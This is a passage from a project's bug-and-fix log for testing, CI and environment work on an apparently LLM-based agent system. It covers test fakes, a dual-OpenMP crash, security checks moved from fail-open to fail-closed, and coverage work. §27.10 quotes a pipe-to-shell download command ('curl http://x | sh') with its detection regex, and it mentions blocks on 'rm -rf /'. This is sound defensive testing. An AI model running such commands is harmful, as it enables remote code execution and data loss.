# Error Log & Fixes · Testing / CI / Environment / Dependencies

[← Back to index](./README.en.md) | [简体中文](./08-testing-ci.md)

> Split from `docs/ERRORS_AND_FIXES.en.md` by module; section numbers are unchanged (§104–§107 fix duplicated numbers in the original—see the index). 19 sections: §20、§27、§30、§31、§32、§33、§34、§35、§36、§37、§44、§45、§52、§53、§54、§55、§58、§66、§81.

---
## 20. Test fakes diverged from real model fields (backend)

**Symptom:** Every perception-triggered thought (trigger_think) sent the LLM an identical prompt — `"检测到环境高强度变化（perception:）。请自然简短地关心/提醒用户…"`, with `perception:` always followed by nothing.

**Root cause:** `trigger_think._trigger` built descriptions via `getattr(d, 'description', '')`, but the real `Difference` model (dataclass in `modules/perception/difference/models.py`) **has no `description` field** — only `id/source_type/category/intensity/payload/…`. So desc was always `source_type:` (`perception:`), identical every time.

**Why tests missed it:**
1. **Tests defined a custom fake class `_Diff`** adding `description="变化"` themselves — the fake "looked like it had description," masking the real model's missing field;
2. **Tests only asserted "was it triggered"** (`_run` called, trigger counts), **never inspecting the desc/prompt content sent to the LLM** — content-quality problems like emptiness were simply uncovered.

**Fix:** `_trigger` now uses fields that really exist — `category` + `payload.target/change_type` build readable descriptions (e.g. `screen_changed:主窗口`), varying with actual differences; new tests assert desc content using the real field structure.

**Lessons (most valuable):**
1. **Test inputs must be built from real production models** (or field-identical copies) — don't invent plausible-looking fakes. When fake fields differ from the real model, tests pass while real runs expose exactly those field gaps.
2. **Code consuming production data objects needs tests asserting output content quality**, not just "it was called" — `getattr(x, 'field', default)` returning empty defaults hollows out content; only content assertions catch it.
3. Before writing fixtures, grep the production model definition for exact field names; don't guess.

---

## 27. macOS dual libomp segfault/abort + test-vs-production environment audit (backend/environment)

**Symptom:** Running `test_chat_light_* + test_conscience` together crashed:
- First `OMP: Error #15: Initializing libomp.dylib, but found libomp.dylib already initialized` → `Fatal Python error: Aborted` (exit 134)
- With `KMP_DUPLICATE_LIB_OK=TRUE`: `Segmentation fault` (exit 139), random crash points (torch import / BERT forward)
- `test_conscience` alone (12) or `test_chat_light_*` alone (34) both passed; only combined runs crashed — flaky, timing-related

**Root cause (two layers, empirically investigated):**
1. **Dual OpenMP runtimes (true root cause)**: `otool -L` confirmed `faiss/_swigfaiss.abi3.so` and `torch/lib/libtorch_cpu.dylib` each depend on **their own** `libomp.dylib` (`@loader_path/.dylibs/libomp.dylib` vs `torch/lib/libomp.dylib`). Two OpenMP copies in one process abort on second initialization (OMP: Error #15); tolerating via `KMP_DUPLICATE_LIB_OK`, the two thread pools conflict at runtime → random segfaults.
2. **A previously suspected concurrency race**: crash stacks showed `event_store.py:268 _worker` background threads, briefly suspected of racing torch load/inference with the main thread. Added `EmbeddingEngine._load_lock`/`_infer_lock`, disabled workers in tests — **all ineffective**. Minimal scripts reproducing faiss→torch / torch→faiss alone ran fine, showing dual libomp doesn't always crash; crashes needed "two OpenMP copies + pre-existing thread state" timing. **Lesson: for native crashes, start with minimal repro + bisect combinations; don't rush to change business code.**

**Root fix:** `scripts/fix_macos_libomp.py` uses `install_name_tool -change` to point faiss's binary at `@loader_path/.dylibs/libomp.dylib` → torch's libomp **absolute path**; dyld dedupes via canonicalized path → single **OpenMP runtime** per process; re-signed with `codesign --force --sign -`.
- `KMP_DUPLICATE_LIB_OK` demoted from "fix" to "fallback" (avoids abort in environments without the script, but not guaranteed stable)
- Re-run the script after upgrading faiss/torch (`--check` detects, `--restore` reverts)

**Verification:** Combined 46 tests pass; with **no KMP_DUPLICATE_LIB_OK set**, `faiss + torch + BERT inference` works normally (proving single OpenMP); combined runs stable across 3 consecutive attempts.

**Lessons:**
1. **"Multiple instances of dynamic libraries" (OMP/OpenSSL/others) cannot be fixed by env tolerance** — `KMP_DUPLICATE_LIB_OK` is officially "unsafe, unsupported": it only removes init aborts, runtime still randomly segfaults. Root fix means merging to a single instance (install_name_tool pointing at one absolute path).
2. **Environment-level fixes must ship as repeatable scripts** (invalidated by dependency upgrades) + fallback env + docs, otherwise they recur on new machines/upgrades.
3. **For native crashes: minimal repro + bisect test combos first**, capture thread stacks with faulthandler, distinguish "always crashes" from "timing flaky".

### 27.1 Tests inconsistent with real production environment (audit checklist)

| Item | Status | Disposition |
|---|---|---|
| `test_conscience.py` clean_state | Previously fell back to prod `data/events_faiss_<USER>.index` (fixture passed only db_path) | **Fixed**: faiss/id_map pointed to temp dirs together + `EventRetrieval._instance` reset |
| `test_trigger_think.py` `_Diff` | Fake carried a `description` field absent in production (§20 warning pattern); old tests asserted only trigger counts | **Fixed**: `_Diff` uses real fields (category+payload); content assertions covered by §20's new tests |
| `test_chat_light_thinker.py` | mem_store used hashlib fake embeds (production: torch BERT 384-dim) — deterministic tests reasonable; real embeds covered by `test_memory_search.py` | Reasonable, kept |
| `EMBEDDING_BACKGROUND_WORKER` | Off in tests, on in production | Reasonable difference (tests don't need background vectorization); conftest comments explain |
| `generate()` clients | Test mocks threw TypeError when signatures diverged from production (§25) | Unified + mocks synced |

### 27.2 Surface-fix review (key reminders)

- **`KMP_DUPLICATE_LIB_OK=TRUE` (settings.py / conftest.py)** — the most typical surface fix; upgraded to root-cause merge script.
- **193 `except Exception: pass` repo-wide** — most justified (ImportError probing/background cleanup/degradation), but this is a high-incidence zone for "errors swallowed, real problems masked". Before changing, confirm whether swallowing is acceptable and whether it should log.
- **`test_write_final_result_supervisor/expert`** originally only `assert_called_once()`; strengthened to assert written content (same lesson as §26).

### 27.3 Zero coverage of real core paths (re-validating §19's lesson)

Investigation found the real vision methods of `infra/data_process/core/image_analyzer.py`
(`_detect_available_model` / `_analyze_openai` / `_analyze_mlx_vlm` / `_analyze_qwen_vl`)
had **zero test coverage** — `test_screen_monitor_and_vision.py` / `test_ui_interactor.py` entirely used
monkeypatched analyzer fakes; the real vision code (including §26's base_url normalization, VISION_BACKEND
detection, deepseek/openai message formats) had no regression protection whatsoever. Exactly §19's "mock masks real implementation" lesson.

**Fix:** Added `tests/unit/test_image_analyzer.py` (8 tests):
- `_detect_available_model`: api without key → unavailable / api with key → openai / unknown backend tolerant fallback
- `_analyze_openai` base_url normalization (`/chat/completions` dedup, §26 regression) + plain URLs preserved
- deepseek base64 inline vs openai image_url message formats
- `analyze()` graceful degradation when backends unavailable

**Lesson:** When hunting test gaps, specifically look for modules where tests use only mock/patch fakes and never touch the real implementation —
such modules' real paths have zero regression protection and are high-incidence zones for §19/§20-type incidents.

### 27.4 Production fail-open fixes + mock-masking inventory (full audit)

**Production fail-open (security-critical, fixed):** Two spots in `modules/security_system/tool_security_gate.py`
swallowed security-check exceptions via `except Exception: pass` → **fail-open** (when permission system/security interception errored, tools were let through bypassing the gate):
- Role category permission check exceptions (formerly :254 silent pass) → fail-closed: log + audit + reject
- Write-operation security interception check exceptions (formerly :281 silent allow) → fail-closed: log + audit + reject

**Fix verification:** New `TestFailClosedOnCheckExceptions` (2 tests) — mocked permission check raising, mocked interception check raising,
both assert `check()` returns rejection. Security checks must fail closed is iron law; any "on error, continue allowing" is a high-risk surface fix.

**Inventory of real core paths masked by test mocks (explore full scan):**

| Production symbol | Masked by mocks | Real coverage |
|---|---|---|
| `trigger_think._run/_has_active_connections/_think` | fully patched in test_trigger_think.py | **None** (external only) |
| `ToolSecurityGate._check_user_review/resolve_review` | 7 spots across test_toolgate:166-280, test_control_mode:57-80 | **None** |
| `ModelRunnerManager` entire class | only get_runner_manager replaced | **None (zero references)** |
| `MultiModelOrchestrator._execute_multi_model_thinking` | all deps mocked | **None** |
| `ContinuousThinker` class | replaced by fake class at model_runner_core:269,299,330 | Partial (__init__ etc.) |
| `ModelRunner` 14 methods | unreferenced | **None** |
| `ImageAnalyzer` local VLM+UI 16 methods | replaced by fakes in 4 test files | Partial (§27.3 added API branches) |
| `management/api.py` 41 endpoints | — | Zero coverage |

**Lessons:** When auditing "tests vs production inconsistency", two categories matter most:
1. **Silent error swallowing in security/permission code → fail-open** (far more serious than functional bugs) — every security-check `except: pass` must fail closed;
2. **All-mocked tests leaving real core paths uncovered** — trigger_think's real chain, approval future resolution,
   runner orchestration, orchestrator end-to-end remain regression blind spots; prioritize adding real-implementation tests for high-value ones.

### 27.5 Continued fixes: real approval-path tests + permission controller fail-open (continued)

Continuing §27.4's mock-masking inventory: this round adds real-implementation tests and fixes one more fail-open:

**1. Real tests for `ToolSecurityGate._check_user_review` (4 tests, test_toolgate.py)**
The core approval path (future wait + `resolve_review` resolution + overlap prevention + `Suspension` global suspend/resume) was patched in 7 places.
New real tests: approve flow (resolve True → returns "用户批准"), reject flow, overlap prevention (second request on same tool returns pending,
no duplicate approval), unknown request_id doesn't error; each asserts `Suspension` suspend is restored in finally.

**2. Real prompt-chain tests for `trigger_think._think` (2 tests, test_trigger_think.py)**
`_run/_think` were fully masked by `_fake_run`. New tests drive the real `_think` with mocked boundaries (`generate_and_push`/`call_outreach_llm`),
asserting the LLM prompt **really contains the difference description** (guarding §20's empty-desc regression), correct message types/events, no crash on empty desc.

**3. `tool_permission_controller._get_caller_permissions` fail-open → fail-closed (critical)**
`check_execution_permission` allows when `permissions is None`; meanwhile `_get_caller_permissions`'s outer
`except Exception: pass → return None` turned permission-query exceptions into silent Nones → **with a broken permission system all tools bypassed category checks**.
Fix: outer exception now logs + returns `ModelPermissions(allowed_tool_categories=[])` (empty permissions → reject all),
while "normally not found" still returns None (preserving default-allow semantics for control tools). Inner YAML parsing exceptions log for traceability.
Added 2 tests: model_factory raising → `check_execution_permission("git_add")` rejects; control tools keep default-allow.

**Verification:** test_toolgate 74 pass; permission-related (control_mode/tool_visibility/tool_permission/probe_permission)
128+17 pass; image_analyzer/trigger_think/conscience etc. 156 pass.

### 27.6 Fake-test sweep (continued): misnamed + assertion-free + flaky timeouts

Full scan of test doubles and assertion quality under the "fake test" pattern:

**Fixed misnamed/assertion-free tests:**
1. `test_build_system_prompt_contains_role` (core_continuous_thinker) — name promised a role assertion but body
   swallowed everything via `try/except pass`; also called `_build_prompt("用户输入", "初始问题")` passing round_num as a string.
   Renamed to `test_build_prompt_contains_question`: really builds and asserts the prompt contains the initial question.
   **Incidental finding**: `_build_prompt` output only has the 【当前任务】 section; role persona comes from the system prompt (consistent with the docs
   line-601 comment) — the test name was misleading from the start.
2. `test_rebuild_faiss_dim_same/mismatch` (embedding) — no assertions; added: same dim doesn't rebuild (os.remove not called),
   different dim triggers rebuild.
3. `test_emit_streaming_content` (model_runner_core) — collected broadcast messages but asserted nothing; added: messages really carry
   `entry_type="streaming_delta"`/delta content/tier/round.

**Fakes verified reasonable (not fake tests):** FakeEvent/FakeChain (covering consumed fields), FakeThinker/FakeBlackboard/
FakeRepo (backend slimmed in-memory doubles), FakeClient/FakeMCP (real interfaces), FakeObs (explicitly aligned with real model fields),
FakeGtts (external-library double), _FakeValueSystem (interface matches real; only its "not implemented" comment was stale), _FakeRepo (consumes minimal interface).

**Flaky root-cause fix:** `test_image_analyzer.py` sporadic timeouts — `_detect_available_model` really executes
`from mlx_vlm import ...` → triggers heavy transformers imports; combined runs exceeded pytest's global `--timeout=10`.
Added module-level `pytestmark = pytest.mark.timeout(60)` (same as conscience). Stable across 5 consecutive combined runs.

**Lessons:** Three tells for spotting "fake tests" — ① names implying behavioral expectations with assertion-free bodies that only swallow errors; ② assertions checking only
"was called/didn't raise", never content; ③ tests importing heavy libraries hit the global 10s timeout producing order-dependent flakiness —
relax timeout per-module as needed.

### 27.7 pass-statement sweep + nondeterministic test review

**Full verification of `pass` statements in tests (37 occurrences)**: 35 reasonable — mock placeholders (`async def accept: pass`/`__aexit__`/`close`),
exception class definitions (`class X(Exception): pass`), teardown cleanup, ImportError dependency probes. **2 were fake tests, now fixed:**

1. **`test_context_slicer.py::test_slice_for_large_basic` (fake test masking a real bug)** —
   `try: slice_for_large("用户输入", {}, {}, {}, {}) ... except (AttributeError, TypeError): pass`.
   Removing the swallow exposed: `slice_for_large`'s signature had long changed from multi-param to a **single `CognitiveBlackboard` param**,
   so the test kept passing 5 args triggering TypeError, silently swallowed — the test ran empty and falsely passed. Fixed with a real `CognitiveBlackboard`
   instance + asserting output contains goal. **Lesson: `except (TypeError, AttributeError): pass` is a hotbed of fake tests —
   it masks genuine regressions like "production interface changed, tests didn't follow".**
2. One `with patch.object(...): pass` in `test_screen_capture_daemon.py` (no operations, no assertions while patched)
   dead code, removed.

**Nondeterministic test review (outputs could differ per run)**: random numbers/`set` iteration: 0; time-related 55 all relative comparisons
(cooldowns/time windows), no date literals bound; timing-sleep assertions use boundary tolerance (e.g. `count >= 1`) not exact values;
array-order assertions 5 — 3 rely on order-preserving underlying lists, 1 test sorts itself, 1 single-element; real LLM/API all
mocked (no live calls); uuid used only for unique test data, values unbound. **Conclusion: no unreasonable nondeterministic assertions.**

### 27.8 config/providers wiring (Plan B): format layer merged into infra/model

**Background:** `config/providers` was an early-designed format adaptation layer (ProviderBase + openai/anthropic/dashscope +
registry), never wired in production (0% coverage) — the three `infra/model` clients each built duplicated format branching
(`_api_format` + anthropic/openai/dashscope three-way branches), and the two implementations had diverged:
`config/providers/openai.py`'s `chat_url()` normalizes `/v1`/`/chat/completions`, while clients posted
directly `session.post(api_url)` without normalization (configuring `https://api.openai.com/v1` would 404; currently avoided by configuring URLs containing full endpoints).

**Merge approach (no brute-force replacement, no feature reduction):**
1. All three clients wire Providers in `__init__` via `get_provider(model, key, url, api_format)`;
   uniformly use `provider.build_headers()` / `build_request()` / `chat_url()` (respecting explicit `_api_format`,
   inferring from URL when unset).
2. Enhanced Provider to cover client capabilities: `OpenAIProvider.parse_response` gained `reasoning_content` (thinking mode);
   `ProviderBase.build_request` interface gained `top_p` (small-client-only param; effective for openai, ignored by anthropic/dashscope).
3. **Kept client-specific logic** (no reduction): large's DashScope legacy text tool-call parsing, streaming accumulation parsing
   (`_parse_openai/_anthropic/_dashscope_stream`), HTTP/retry/logging/SSL, `reasoning_content` fallback,
   usage semantics; small/medium's `api_messages` serialization (tool_calls/tool_call_id/reasoning_content round-trip).
4. Unified URL: all requests go through `self._chat_url = provider.chat_url()`, eliminating the `/v1` 404 hazard.

**Verification:** New `tests/unit/test_providers.py` (17 tests: URL inference/explicit format, build_request across three formats,
chat_url normalization, parse_response incl. reasoning_content, stream single-line parsing); 216 model-related tests +
full unit suite 1141 pass (test_post_format payload assertions prove post-wiring request formats identical to before).

**Lesson:** Two adaptation layers doing the same job inevitably diverge (format-detection defaults, URL normalization inconsistencies). Merge direction:
"format construction/parsing belongs to Providers; HTTP skeleton and client-specific logic stay in clients," locked down by payload-format tests
(test_post_format) proving behavior unchanged.

### 27.9 End-to-end all green + coverage additions (utils/agent tools/streaming/memory chain)

**End-to-end:** `pytest tests -m "not external and not slow"` → **1569 passed, 0 failed**.
Fixed one combined-suite flake: `test_causal_graph_comprehensive`'s semantic query triggered real BERT loading exceeding
pytest-timeout 10s (same as conscience); added module-level `timeout(60)`.

**New tests (by uncovered priority):**
- `tests/unit/test_utils.py` (19) — time_utils/json_utils/async_utils/exceptions from **0% → fully covered**
  (time conversion, JSON serialization incl. datetime, async concurrency control/timeout, exception hierarchy and safe_call/safe_acall).
- `tests/unit/test_agent_tools.py` (15) — calculator (pure logic), todo (file persistence + session isolation),
  audit_tools (logs + audit report), tools_search (keyword/category filtering).
- `tests/unit/test_large_model_stream.py` (7) — large-model client's three streaming parsers (openai incl.
  reasoning_content/tool_calls accumulation, anthropic content blocks, dashscope cumulative text deltas).
- `tests/unit/test_memory_chain.py` (19) — depth_recall pure logic (intent classification/trigger decision/
  _time_decay/_build_conclusion) + causal_tree (CausalChain.summary/EvidenceTree.format).
- Previously `tests/unit/test_providers.py` (17) — config/providers format layer (after §27.8 wiring).

**Coverage gains:** config/providers 0%→covered, utils 0%→covered, agent tools 8-18%→significantly up,
large_model_client 13%→incl. streaming, depth_recall/causal_tree 11-12%→pure logic covered.

### 27.10 Continued coverage: management/api endpoints + security tools (git/exec_command)

**New tests (full suite 1569 → 1602 green):**
- `tests/unit/test_management_api_ext.py` (14) — zero-coverage management/api endpoints: health_check (healthy/degraded),
  root, context series removed with GCM, get_thinking_status (healthy/unavailable), get_security_status,
  get_sessions/get_runners/get_model_runners (empty/with sessions), get_bus_stats, memory endpoints (temp EventStore
  singleton + keyword filtering). Note: calling endpoint functions directly requires passing FastAPI Query defaults explicitly (`limit=50` etc.).
- `tests/unit/test_git_tools.py` (12) — _run_git success/timeout/not-installed, git_status porcelain parsing
  (XY statuses), git_push `--force` injection guards (`remote="-"`/`branch="--force"`), git_diff add/del line stats.
- `tests/unit/test_exec_command_safety.py` (7) — exec_command extreme-danger hard blocks (rm -rf / etc.),
  chained-command high-risk detection.

**Incidental security fix (pipe-to-shell missed):**
`_DANGEROUS_PATTERNS` entries `"curl.*|.*sh"`/`"wget.*|.*sh"` are regex syntax, but `_detect_dangerous_command`
uses substring matching (`pattern in cmd`), treating `. *` literally → **classic download-and-execute vectors like `curl http://x | sh` were missed**.
Added `_DANGEROUS_REGEX` (`curl\s+\S+.*\|\s*(ba|z|k)?sh` etc.) checked via `re.search`; tests confirm hits.

**Lesson:** Regex-style entries in security detection lists must run through a regex engine, otherwise "looks like detection, actually decorative" — when writing tests,
verify with real attack payloads (`curl http://x | sh`), not just substrings.

**Coverage gains:** management/api's 41 zero-coverage endpoints greatly reduced; agent security tools (git/exec_command) critical paths covered;
exec_command danger-detection pure logic fully covered.

### 27.11 Continued coverage: web_search / ModelRunnerManager / identity_loader / values_store / causal_tree

**New tests (full suite 1602 → 1657 green):**
- `test_web_search.py` (14) — regex/HTML parsing, content sanitization (Markdown/injection/truncation), DDG search (incl. 202 rate limit),
  fallback chain (ddg_html→lite→sogou→bing→baidu, total failure), limit clamp.
- `test_model_runner_manager.py` (8) — ModelRunnerManager capacity limits (max_per_role/max_tier rejection),
  model_id unique suffix, probe_map registration, stop_runner cleanup, global registry same-session reuse (class previously at 0% coverage).
- `test_identity_loader_ext.py` (13) — external YAML identity loading (tier validation/unknown-field filtering/filename inference),
  merging (override/new entries auto-filled defaults). Note: renamed to `_ext` due to basename clash with `tests/integration/test_identity_loader.py`.
- `test_values_store.py` (14) — real ValueSystem (previously test_value_formatter always used a double):
  init/read-write/partition parsing/add/remove/update/cleanup/reset/quality gating/similarity dedup.
- `test_causal_tree.py` (6) — CausalTree tracing (`_trace_to_root`, root cause first), evidence collection sorted by importance,
  expand_node full chain (up/downstream links + evidence).

**Incidental resource-leak fix (real bug):** `ApiLogStore.__init__` starts a background `_flush_loop` daemon thread but
had **no stop()** — one resident `time.sleep(1)` thread per instance; after tests created multiple temp stores, pytest hung on exit
(INTERNALERROR Timeout, leftover `_flush_loop` threads). Added `stop()` (set flag + join + flush + close connections),
called by test_management_api's `api_log` fixture teardown.

**Lessons:** ① For full-suite hangs at exit: check pytest INTERNALERROR thread stacks first — resident daemon threads
(sleep loops) are classic leak sources; any class starting threads in `__init__` must provide `stop()`; ② avoid duplicating existing test basenames
(`test_identity_loader` name clash caused a collection error).

**Coverage gains:** web_search (8%), ModelRunnerManager (0%), identity_loader (0%), values_store (0%),
causal_tree (12%) critical paths covered.

### 27.12 Continued coverage: tool_discovery / context_budget / management causal-graph endpoints

**New tests (full suite 1657 → 1685 green):**
- `test_tool_discovery.py` (9) — tool discovery engine (previously 0%): exact-name/keyword/tag/category relevance,
  sorting/limit/min_relevance, get by category/tag, task recommendation (calc hit).
- `test_context_budget.py` (14) — context budgeting (previously 0%): allocate tiers (few/many/medium tools),
  token estimation (CN/EN), tool-description token heuristics, simplification decisions, memory/dialog-turn recommendations, role-based budgets.
- `test_management_api_ext.py` +5 — causal-graph endpoints: graph data (nodes/edges/stats),
  metrics, node details (predecessors/successors/related events/AppError when missing), causal tree expansion.

**Coverage gains:** tool_discovery (0%), context_budget (0%), management causal-graph endpoints (the original 41
zero-coverage endpoints keep shrinking).

**Lesson:** For token-estimation heuristics (3 chars/token CN, 4 chars/token EN), compute exact expected values from the formula in tests;
don't assert size relationships by intuition (70 Chinese characters actually cost more tokens than 100 English ones).

### 27.13 Continued coverage: remaining management endpoints (database/info-process/perception)

**New tests (full suite 1685 → 1688 green):**
- `test_management_api_ext.py` +3 — `/database` (disk_cache stats + sqlite table info),
  `/info-process` (ImageAnalyzer/SpeechRecognizer status, mocked classes), `/perception` (perception system status,
  started→running).
- At this point only a handful of management's 41 zero-coverage endpoints remain (start/stop_perception, memory event CRUD,
  skills already covered, clear_memory, etc.).

**Note (Python pitfall):** The package attribute of `modules.database.disk_cache` is shadowed by the `disk_cache` instance in its `__init__` —
`import modules.database.disk_cache as dc` binds the **DiskCache instance**, not the module
(`dc` has no `disk_cache` attribute). Tests should do `from modules.database.disk_cache import disk_cache` to grab the instance
then monkeypatch methods.

**Coverage gains:** management endpoints nearly all green; combined with earlier rounds, previously-0% modules (utils/providers/identity_loader/
values_store/tool_discovery/context_budget/ModelRunnerManager) are all covered now.

### 27.14 Continued coverage: memory event CRUD + ModelRunner methods

**New tests (full suite 1688 → 1707 green):**
- `test_management_api_ext.py` +6 — memory event CRUD (create/get/update/delete, NOT_FOUND when missing, clear_memory wipes),
  deprecated tool-skills endpoint. All 41 zero-coverage management endpoints now covered.
- `test_model_runner_methods.py` (13) — ModelRunner previously had 14 uncovered methods; this round covers core:
  `_has_required_tool_args`/`_missing_required_tool_args` (calc schema required-param validation: all params/missing params/
  nulls/unknown tool), `_build_tool_guard_prompt` (minimal for few tools / detailed for many / forced detailed for large tier),
  `_build_tool_prompt_section` (placeholder empty string), `_build_prompt` (task description/identity/role boundaries/guidance/
  skill stacking only for large tier).

**Lesson:** When asserting prompt-method output, first confirm the actual wording (`【工具调用硬性规则】` not `【工具调用规则】`) —
for `in` substring assertions, ground them in real production output rather than guessing from method names.

**Coverage gains:** all management endpoints covered; ModelRunner methods down from 14 uncovered to a few heavy ones
(`_wait_for_user_response`/`_run_runtime_expert` need real inference chains).

### 27.15 Continued coverage: ModelRunner interactive-wait methods

**New tests (full suite 1707 → 1713 green, `test_model_runner_methods.py` +6):**
- `_wait_for_user_response`/`resolve_user_response` — future wait → resolve fills and returns, pending cleaned up,
  timeout returns `{"timeout": True}`, unknown request_id doesn't error
- `_handle_ask_user_intent` — after resolve returns `【用户意图】用户的回答：...`
- `_handle_mode_change_request` — approve (`ToolSecurityGate.resolve_review` resolution → switches
  `settings.EXECUTION_MODE` and restores) and reject (returns rejection text)

**Lessons:** ① For interactive methods (future waits) use the "task + sleep to suspension point + resolve + wait_for" pattern;
② `_handle_ask_user_intent` reads `result["answer"]`, not `response` — resolve payload field names must match the consumer;
③ `ToolSecurityGate._pending_reviews` is a **class attribute**; module-level `tsg._pending_reviews` can't reach it.

**Coverage gains:** ModelRunner heavy interactive methods (approvals/question waits) covered; remainder tiny
(`_run_runtime_expert`, `_on_wakeup_message` etc. need full runtime chains).

### 27.16 Wrap-up: remaining ModelRunner methods + doc structure fixes

**New tests (full suite 1713 → 1721 green, `test_model_runner_methods.py` +8):**
- `_format_messages_for_context` (ChatMessage/dicts/dict-content thinking_result extraction/recent-20 truncation)
- `_consume_guidance` (pending guidance consumed → `thinker.add_external_prompt`)
- `_check_messages` (mocked bus.receive messages → normalized fields)
- `_on_wakeup_message` (sets wakeup_event)

At this point ModelRunner's previously-uncovered 14 methods leave only `_run_runtime_expert`/`_build_runner_prompt` (need full runtime chains).

**Doc structure fixes:**
- §21 (outreach bypass) title was originally concatenated at §18's end (missing newline) + out of order (before §19/§20) — split onto its own lines and moved after §20, restoring 18→19→20→21→22 order.
- §25's "default behavior unchanged (backward compatible)" has since been superseded by making generate's parameter required — annotation added pointing to §27.8.
- Spot-checked §26/§27.4/§27.8/§27.10/§27.11 records against actual code (validate_attachments, fail-closed,
  providers wiring, pipe-to-shell regex, ApiLogStore.stop) — consistent.

### 27.17 Chatonly-mode persona settings had no effect (frontend settings ignored)

**Symptom:** After setting a persona for a custom orchestrator agent on the Orchestration page, the system prompt stayed completely unchanged in **chatonly mode**.

**Root cause:** Chatonly is a single persona — `chat_light/prompt_composer.py` hardcoded reading only the **`orchestrator`** role's
`get_persona("orchestrator")`/`get_system_override("orchestrator")`. But custom agents (tier=large) from the Orchestration page store personas under **custom role keys** in `personas.yaml` (e.g. `'123'`), not under `orchestrator` →
chatonly couldn't read them → settings ineffective. Agent mode reads per-role keys so it worked.

**Fix (`chat_light/prompt_composer.py`):** when `orchestrator` has no custom persona, fall back to the user-defined
**large-tier orchestrator agent** persona (iterate `get_custom_agents()` for the first tier=large entry with a persona).
`system_override` priority unchanged (used directly when non-empty).

**Verification:** Added 2 tests (`test_chat_light_prompt.py`): orchestrator without persona → falls back to custom large-agent persona effectively; orchestrator with persona → takes priority, no fallback. Full suite 1723 pass.

**Lesson:** Another occurrence of §18/§22's "config written but consumer doesn't read" pattern — frontend saves config to slot A (custom role),
backend consumer reads slot B (orchestrator); mismatched keys across ends. When debugging "settings have no effect", first map frontend-saved keys against backend-read
keys, then verify the real chain (`set_persona → build_system` output).

### 27.18 Custom agents never wired into scheduling ("saved but unread"; §22 consumer-audit blind spot)

**Symptom:** After "adding" a custom agent on the Orchestration page (tier/model_id/persona saved), agent mode couldn't actually schedule it —
only chatonly mode (§27.17 fix) read large-tier custom agent personas; agent mode's `start_runner` rejected outright.

**Root cause:** `identity.py::get_identities()` loaded identity templates only from `config/prompts/roles.yaml`,
**never merging personas.yaml custom agents**. And agent-mode scheduling `ModelRunnerManager.start_runner`
rejects unknown identities via `identity_key not in get_identities()` → custom agents created on the Orchestration page aren't in the identity table
→ can never start. The `model_id` field also had no consumer (model instances still created per-tier default).

**Why tests missed it:** ① `get_identities` fully mocked, never asserting the "should contain custom agents" contract;
② the `create_custom_agent` endpoint lives in `api/main.py` (not `modules/management/api.py`) and fell outside §27.x endpoint audit scope — zero tests;
③ `start_runner` unknown-identity tests used fake identity dicts, masking that real custom identities were absent.
**Essence: another instance of §18/§22's "saved but unread", and §22's consumer audit only covered config keys, not extending to
"whether objects created by the frontend (agents) are consumed by scheduling".**

**Fix:** `get_identities()` merges personas.yaml custom agents (converted to identity-template structures);
model creation honors custom agent `model_id`/tier; scheduling layer can start custom roles.

**Lesson:** Debugging "saved but unread" requires tracing **every frontend write-entry point** (not just config keys) to backend consumers —
Orchestration page additions/personas/permissions/model params/activation toggles all need verifying that "what was saved really gets read".

### 27.19 Full consumer-audit fixes (frontend/backend "saved but unread" cleanup)

Extending §22's consumer audit per §27.18 to **all frontend write operations** (40+ endpoints → saved data → scheduling consumers),
fixed 5 issues:

1. **Shared-dict pollution (identity)**: `_load_from_yaml` mutated the shared dict from `loader.load("roles")` directly;
   custom-agent merges left residue polluting subsequent loads → shallow copy.
2. **agent_active toggle unconsumed by scheduling**: Orchestration toggles only saved/displayed; `start_runner` never checked →
   disabled agents still started. `start_runner` now rejects when `get_agent_active is False`.
3. **persona-presets read-side 500**: `get_persona_presets` wrote `for k,v in presets.values()` (unpacking a 3-key dict crashes)
   → presets could never be listed/applied after saving. Changed to `presets.items()`.
4. **Custom agent personas absent from system prompt**: `config/prompts/composer._get_role` read only roles.yaml;
   custom roles fell back to orchestrator clone → now looked up from `get_identities()` (including Orchestration custom agents).
5. **expertise comma-string split into chars**: identity merge stored expertise strings as-is; `from_template`'s
   `list(...)` split into single chars → convert comma strings to lists at merge time.
6. **LOG_LEVEL decorative**: `setup_logger` hardcoded "INFO", Settings LOG_LEVEL changes did nothing → default now reads
   `settings.LOG_LEVEL`.

**Correctly consumed (no change needed, for reference)**: personas/system_overrides/role_tools/model_params, skills
enabled/forced/role-skills, tools enabled (visibility), scheduled_tasks prompt/outreach, todos, memory-store switching.

**Could be strengthened (not decorative)**: tools enabled filters visibility only; `tool_security_gate` execution path doesn't block direct invocation of disabled tools.

**Verification:** New `test_custom_agent.py` (11 tests: identity merge/deletion invalidation/endpoints/scheduling/activation toggle/preset read-side/
composer custom persona/LOG_LEVEL); full suite 1733 pass.

---

## 30. ScreenMonitor background-thread leftovers → random hangs in full pytest runs (backend/testing)

**Symptom:** Full-suite tests randomly hit INTERNALERROR/hangs (pytest-timeout fired at 20s but the session aborted); faulthandler dumps showed a thread stuck in `screen_monitor_source.py _read_stdout_loop` endlessly calling a mocked readline, while the main thread was stuck in pytest capture `readouterr`.

**Root cause:** The reader background thread (non-daemon) started by `ScreenMonitorSource._ensure_process` kept running after a test finished unless stop was called explicitly; tests used `__new__` to bypass `__init__` (instance not in the registry, so it cannot be cleaned up) + mocked out `_close_process` (`_reader_running` stays True, so the thread never stops). The leftover thread held pytest capture fds → the next test's capture read blocked (fd leak + mock-induced deadlock).

**Fix (three layers):**
1. Production code: add class-level `weakref.WeakSet` active-instance registries to `ScreenMonitorSource`/`ScreenDiffSource`; `stop()` unregisters
2. conftest autouse fixture `_stop_background_sources` uniformly stops leftover instances
3. Test corrections: `_source` registers manually + no longer mocks `_close_process`

**Verification:** The combination that previously always hung now passes stably 5/5; the full suite exits normally.

**Similar-issue sweep:** `setup.py` (window_detector), `PerceptionEventBus`, and the voice/hotkey/ocr detectors all had non-daemon background threads; all were added to the weakref registry + unified conftest cleanup.

---

## 31. test_detect_text OCR ordering pollution — sys.modules set to None at module level (backend/testing)

**Symptom:** In full-suite runs, `test_screen_monitor_server.py::test_detect_text` failed sporadically; passed when run alone.

**Root cause:** `test_mcp_screen_monitor.py` set `sys.modules["rapidocr_onnxruntime"] = None` at module level, permanently polluting (to prevent loading real OCR); subsequent tests importing `screen_monitor_server` ended up with `_ocr` as None, so the `extract_text=True` branch never ran → assertion found no text.

**Fix:** `test_detect_text` switched to monkeypatch-injecting a fake OCR (temporarily replacing `sms._ocr`), no longer relying on module-level pollution.

**Lesson:** Module-level `sys.modules[X] = None` pollutes the entire test process; use monkeypatch/local injection instead.

---

